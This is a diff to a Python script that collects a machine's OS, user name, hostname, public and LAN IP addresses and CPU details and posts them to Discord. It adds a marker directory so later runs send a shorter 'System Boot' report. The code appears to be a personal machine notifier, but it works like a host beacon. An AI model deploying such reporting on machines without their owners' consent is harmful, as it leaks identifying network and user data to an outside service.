@@ -30,19 +30,37 @@ host_name = socket.gethostname()              #server1, cool-laptop
 local_ip_address = socket.gethostbyname(host_name)
 public_ip_address = requests.get('https://api.ipify.org').text
 
-embed = {
-    "title": f"System Information - {host_name}",
-    "color": 0x00ff00,
-    "fields": [
-        {"name": "Operating System", "value": operating_system, "inline": True},
-        {"name": "OS Version", "value": os_version, "inline": True},
-        {"name": "Current User", "value": current_user, "inline": True},
-        {"name": "Host Name", "value": host_name, "inline": True},
-        {"name": "Public IP", "value": public_ip_address, "inline": False},
-        {"name": "Local IP (LAN)", "value": local_ip_address, "inline": False},
-        {"name": "CPU Architecture", "value": cpu_architecture, "inline": True},
-        {"name": "CPU Core Count", "value": str(cpu_core_count), "inline": True},
-    ],
-}
+if os.path.isdir("user_run"):
+    embed = {
+        "title": f"System Boot - {host_name}",
+        "color": 0x808080,
+        "fields": [
+            {"name": "Operating System", "value": operating_system, "inline": True},
+            {"name": "OS Version", "value": os_version, "inline": True},
+            {"name": "Current User", "value": current_user, "inline": True},
+            {"name": "Public IP", "value": public_ip_address, "inline": False},
+            {"name": "Local IP (LAN)", "value": local_ip_address, "inline": False},
+        ],
+    }
+else:
+    embed = {
+        "title": f"System Information - {host_name}",
+        "color": 0x00ff00,
+        "fields": [
+            {"name": "Operating System", "value": operating_system, "inline": True},
+            {"name": "OS Version", "value": os_version, "inline": True},
+            {"name": "Current User", "value": current_user, "inline": True},
+            {"name": "Host Name", "value": host_name, "inline": True},
+            {"name": "Public IP", "value": public_ip_address, "inline": False},
+            {"name": "Local IP (LAN)", "value": local_ip_address, "inline": False},
+            {"name": "CPU Architecture", "value": cpu_architecture, "inline": True},
+            {"name": "CPU Core Count", "value": str(cpu_core_count), "inline": True},
+        ],
+    }
 
 discord_post(embed)
+
+try:
+    os.makedirs("user_run", exist_ok=True)
+except Exception as e:
+    debug_print(f"[Error] Failed to make dir: {e}")
